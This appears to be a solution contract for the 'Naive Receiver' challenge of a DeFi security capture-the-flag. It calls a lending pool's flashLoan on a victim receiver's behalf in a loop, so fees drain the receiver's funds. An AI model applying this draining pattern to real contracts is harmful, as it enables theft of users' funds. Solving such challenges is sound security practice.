import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract AttackReceiver {
    // address 

    constructor() public {}

    function triggerReceiver(
        NaiveReceiverLenderPool _lenderPool, 
        address payable _receiver, 
        uint256 _borrowAmount, 
        uint256 _times
    ) public {
        for (uint i = 0; i < _times; i++) {
            _lenderPool.flashLoan(_receiver, _borrowAmount);
        }
    }
}